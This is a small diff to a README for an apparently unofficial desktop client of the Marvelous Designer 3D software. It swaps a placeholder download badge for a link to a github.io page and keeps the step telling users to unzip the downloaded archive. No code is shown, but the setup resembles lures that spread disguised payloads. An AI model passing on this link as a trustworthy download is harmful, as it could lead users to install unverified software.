@@ -6,7 +6,7 @@ This unofficial Marvelous Designer desktop client brings the industry-leading 3D
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://marvelous-designer-desktop.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
